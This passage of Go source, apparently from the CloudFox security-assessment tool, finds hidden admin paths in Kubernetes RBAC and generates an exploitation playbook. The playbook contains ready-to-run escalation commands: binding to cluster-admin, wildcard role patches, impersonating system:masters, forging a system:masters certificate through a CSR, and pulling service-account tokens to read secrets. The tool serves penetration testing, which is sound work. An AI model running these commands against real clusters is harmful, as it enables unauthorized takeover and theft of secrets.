			roleMap[fmt.Sprintf("%s/%s", allRoles[i].Namespace, allRoles[i].Name)] = &allRoles[i]
		}

		for _, rb := range allRbs {
			var rules []v1.PolicyRule

			if rb.RoleRef.Kind == "Role" {
				if role, ok := roleMap[fmt.Sprintf("%s/%s", rb.Namespace, rb.RoleRef.Name)]; ok {
					rules = role.Rules
				}
			} else if rb.RoleRef.Kind == "ClusterRole" {
				if cr, ok := crMap[rb.RoleRef.Name]; ok {
					rules = cr.Rules
				}
			}

			if len(rules) == 0 {
				continue
			}

			for _, subject := range rb.Subjects {
				principal := formatPrincipal(subject)

				// Check for default SA with namespace-level RBAC modification
				if subject.Kind == "ServiceAccount" && subject.Name == "default" {
					for _, rule := range rules {
						for _, verb := range rule.Verbs {
							for _, resource := range rule.Resources {
								apiGroups := rule.APIGroups
								if len(apiGroups) == 0 {
									apiGroups = []string{""}
								}

								for _, apiGroup := range apiGroups {
									matches := FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)
									if len(matches) > 0 {
										finding := HiddenAdminFinding{
											Principal:      principal,
											PrincipalType:  subject.Kind,
											Namespace:      rb.Namespace,
											Scope:          "namespace",
											RoleName:       rb.RoleRef.Name,
											BindingName:    rb.Name,
											RiskLevel:      shared.RiskHigh,
											Permissions:    extractPermissionsFromRules(rules),
											Description:    fmt.Sprintf("Default SA in %s has RBAC/IAM permissions - any pod without explicit SA inherits these", rb.Namespace),
											IsDefault:      true,
											Feasibility:    "Immediate",
											AttackSteps:    []string{"Deploy pod without specifying serviceAccountName", "Escalate to admin via RBAC permissions"},
											ExploitCommand: fmt.Sprintf("kubectl -n %s run pwn --image=alpine -- sleep 3600", rb.Namespace),
										}
										result.DefaultSAElevations = append(result.DefaultSAElevations, finding)
										result.AllFindings = append(result.AllFindings, finding)
										break
									}
								}
							}
						}
					}
				}
			}
		}
	}

	// Cache the result
	sdk.Set(cacheKey, result)

	return result, nil
}

// Helper functions for AnalyzeHiddenAdmins

func extractPermissionsFromRules(rules []v1.PolicyRule) []string {
	var perms []string
	for _, rule := range rules {
		for _, verb := range rule.Verbs {
			for _, resource := range rule.Resources {
				perms = append(perms, fmt.Sprintf("%s %s", verb, resource))
			}
		}
	}
	return perms
}

func determineFeasibility(category string) string {
	switch category {
	case "Full RBAC Control", "RBAC Modification":
		return "Immediate"
	case "Impersonation":
		return "Immediate"
	case "RBAC Escalation":
		return "Immediate"
	case "Certificate Approval":
		return "Requires-Enum"
	default:
		return "Complex"
	}
}

func getAttackSteps(category string) []string {
	switch category {
	case "RBAC Modification", "Full RBAC Control":
		return []string{
			"Create ClusterRoleBinding to cluster-admin",
			"Or modify existing role to add wildcard permissions",
		}
	case "RBAC Escalation":
		return []string{
			"Use bind/escalate verb to bypass permission checks",
			"Bind self to cluster-admin without having its permissions",
		}
	case "Impersonation":
		return []string{
			"Impersonate system:masters group",
			"Or impersonate cluster-admin user",
		}
	case "Certificate Approval":
		return []string{
			"Create CSR for system:masters group",
			"Approve the CSR",
			"Use generated certificate to authenticate",
		}
	default:
		return []string{"Enumerate permissions and exploit"}
	}
}

func generateHiddenAdminExploitCommand(category, verb, resource, principal string) string {
	switch category {
	case "RBAC Modification", "Full RBAC Control":
		if strings.Contains(resource, "clusterrolebinding") {
			return fmt.Sprintf("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=%s", principal)
		}
		if strings.Contains(resource, "rolebinding") {
			return "kubectl create rolebinding pwn -n <namespace> --clusterrole=admin --user=<your-user>"
		}
		if strings.Contains(resource, "clusterrole") {
			return `kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`
		}
		return "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>"
	case "RBAC Escalation":
		return "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>  # Uses bind/escalate to bypass checks"
	case "Impersonation":
		if strings.Contains(resource, "group") {
			return "kubectl --as=dummy --as-group=system:masters get secrets -A"
		}
		if strings.Contains(resource, "serviceaccount") {
			return "kubectl --as=system:serviceaccount:kube-system:admin-sa get secrets -A"
		}
		return "kubectl --as=system:admin get secrets -A"
	case "Certificate Approval":
		return `# 1. Create CSR for system:masters
openssl req -new -key key.pem -out csr.pem -subj "/CN=admin/O=system:masters"
# 2. Submit and approve CSR
kubectl certificate approve <csr-name>
# 3. Use certificate to authenticate`
	default:
		return fmt.Sprintf("kubectl %s %s", verb, resource)
	}
}

// GenerateHiddenAdminsPlaybook generates a comprehensive playbook for exploiting hidden admin access
func GenerateHiddenAdminsPlaybook(data *HiddenAdminData, identityHeader string) string {
	if data == nil || len(data.AllFindings) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Kubernetes Hidden Admin Exploitation Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified hidden administrative access patterns.
# Hidden admins are principals with IAM/RBAC escalation capabilities that may not be obvious.

`, identityHeader))
	} else {
		sections.WriteString(`# Kubernetes Hidden Admin Exploitation Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified hidden administrative access patterns.
# Hidden admins are principals with IAM/RBAC escalation capabilities that may not be obvious.

`)
	}

	// Cluster Admins section
	if len(data.ClusterAdmins) > 0 {
		sections.WriteString("## Cluster Admins (Immediate Access)\n\n")
		sections.WriteString("These principals have full cluster-admin or system:masters access.\n\n")
		sections.WriteString("### Principals:\n")
		for _, f := range data.ClusterAdmins {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s\n", f.Principal, f.PrincipalType, f.RoleName, f.BindingName))
			if f.IsDefault {
				sections.WriteString("  **WARNING**: This is the default ServiceAccount - any pod without explicit SA inherits this!\n")
			}
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# These identities can do anything - no escalation needed\n")
		sections.WriteString("kubectl get secrets -A\n")
		sections.WriteString("kubectl exec -it <pod> -- /bin/sh\n")
		sections.WriteString("kubectl create clusterrolebinding persistence --clusterrole=cluster-admin --serviceaccount=default:default\n")
		sections.WriteString("```\n\n")
	}

	// RBAC Modifiers section
	if len(data.RBACModifiers) > 0 {
		sections.WriteString("## RBAC Modifiers\n\n")
		sections.WriteString("These principals can modify RBAC to escalate their own or others' privileges.\n\n")
		sections.WriteString("### Principals:\n")
		for _, f := range data.RBACModifiers {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", f.Principal, f.PrincipalType, f.Description))
			sections.WriteString(fmt.Sprintf("  Role: %s via %s | Feasibility: %s\n", f.RoleName, f.BindingName, f.Feasibility))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create ClusterRoleBinding to cluster-admin\n")
		sections.WriteString("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>\n\n")
		sections.WriteString("# Or modify existing ClusterRole to add wildcard\n")
		sections.WriteString(`kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'` + "\n\n")
		sections.WriteString("# Or create RoleBinding in specific namespace\n")
		sections.WriteString("kubectl create rolebinding pwn -n <namespace> --clusterrole=admin --user=<your-user>\n")
		sections.WriteString("```\n\n")
	}

	// Impersonators section
	if len(data.Impersonators) > 0 {
		sections.WriteString("## Impersonators\n\n")
		sections.WriteString("These principals can impersonate other users, groups, or service accounts.\n\n")
		sections.WriteString("### Principals:\n")
		for _, f := range data.Impersonators {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", f.Principal, f.PrincipalType, f.Description))
			sections.WriteString(fmt.Sprintf("  Role: %s via %s\n", f.RoleName, f.BindingName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Impersonate system:masters group (cluster-admin equivalent)\n")
		sections.WriteString("kubectl --as=dummy --as-group=system:masters get secrets -A\n\n")
		sections.WriteString("# Impersonate cluster-admin user\n")
		sections.WriteString("kubectl --as=system:admin get secrets -A\n\n")
		sections.WriteString("# Impersonate a privileged service account\n")
		sections.WriteString("kubectl --as=system:serviceaccount:kube-system:admin-sa get secrets -A\n\n")
		sections.WriteString("# Check what you can do as the impersonated identity\n")
		sections.WriteString("kubectl --as=system:admin auth can-i --list\n")
		sections.WriteString("```\n\n")
	}

	// Certificate Approvers section
	if len(data.CertApprovers) > 0 {
		sections.WriteString("## Certificate Approvers\n\n")
		sections.WriteString("These principals can approve CSRs to create new cluster identities.\n\n")
		sections.WriteString("### Principals:\n")
		for _, f := range data.CertApprovers {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", f.Principal, f.PrincipalType, f.Description))
			sections.WriteString(fmt.Sprintf("  Role: %s via %s\n", f.RoleName, f.BindingName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Step 1: Generate a key\n")
		sections.WriteString("openssl genrsa -out admin.key 2048\n\n")
		sections.WriteString("# Step 2: Create CSR with system:masters group\n")
		sections.WriteString("openssl req -new -key admin.key -out admin.csr -subj \"/CN=pwn-admin/O=system:masters\"\n\n")
		sections.WriteString("# Step 3: Submit CSR to Kubernetes\n")
		sections.WriteString(`cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: pwn-admin
spec:
  request: $(cat admin.csr | base64 | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client
  usages: [client auth]
EOF` + "\n\n")
		sections.WriteString("# Step 4: Approve the CSR\n")
		sections.WriteString("kubectl certificate approve pwn-admin\n\n")
		sections.WriteString("# Step 5: Get the certificate\n")
		sections.WriteString("kubectl get csr pwn-admin -o jsonpath='{.status.certificate}' | base64 -d > admin.crt\n\n")
		sections.WriteString("# Step 6: Use to authenticate\n")
		sections.WriteString("kubectl --client-certificate=admin.crt --client-key=admin.key get secrets -A\n")
		sections.WriteString("```\n\n")
	}

	// Aggregation Roles section
	if len(data.AggregationRoles) > 0 {
		sections.WriteString("## Aggregation Roles\n\n")
		sections.WriteString("These principals are bound to aggregation roles - their permissions can grow as new roles are added.\n\n")
		sections.WriteString("### Principals:\n")
		for _, f := range data.AggregationRoles {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s\n", f.Principal, f.PrincipalType, f.RoleName, f.BindingName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Check current aggregated permissions\n")
		sections.WriteString("kubectl get clusterrole <role-name> -o yaml | grep -A 100 'rules:'\n\n")
		sections.WriteString("# If you can create ClusterRoles with matching labels, you can expand permissions!\n")
		sections.WriteString("# Check aggregation rule:\n")
		sections.WriteString("kubectl get clusterrole <role-name> -o jsonpath='{.aggregationRule}'\n")
		sections.WriteString("```\n\n")
	}

	// Default SA Elevations section
	if len(data.DefaultSAElevations) > 0 {
		sections.WriteString("## Default ServiceAccount Elevations\n\n")
		sections.WriteString("**CRITICAL**: These default ServiceAccounts have elevated permissions.\n")
		sections.WriteString("Any pod deployed without an explicit serviceAccountName inherits these!\n\n")
		sections.WriteString("### Affected Namespaces:\n")
		seenNS := make(map[string]bool)
		for _, f := range data.DefaultSAElevations {
			if !seenNS[f.Namespace] {
				sections.WriteString(fmt.Sprintf("- %s: %s\n", f.Namespace, f.Description))
				seenNS[f.Namespace] = true
			}
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Deploy a pod in the affected namespace WITHOUT specifying serviceAccountName\n")
		sections.WriteString("kubectl -n <namespace> run pwn --image=alpine -- sleep 3600\n\n")
		sections.WriteString("# The pod automatically gets the default SA's elevated permissions\n")
		sections.WriteString("kubectl -n <namespace> exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
		sections.WriteString("# Use the token to access cluster resources\n")
		sections.WriteString("TOKEN=$(kubectl -n <namespace> exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n")
		sections.WriteString("kubectl --token=$TOKEN get secrets -A\n")
		sections.WriteString("```\n\n")
	}

	// Wildcard Bindings section
	if len(data.WildcardBindings) > 0 {
		sections.WriteString("## Wildcard Group Bindings\n\n")
		sections.WriteString("These bindings use wildcard patterns that may match unintended users.\n\n")
		sections.WriteString("### Bindings:\n")
		for _, f := range data.WildcardBindings {
			sections.WriteString(fmt.Sprintf("- %s (Group) via %s/%s\n", f.Principal, f.RoleName, f.BindingName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# If you can create users or authenticate as a user matching the wildcard,\n")
		sections.WriteString("# you will inherit these permissions\n")
		sections.WriteString("# Check OIDC/external auth configuration for user creation vectors\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}
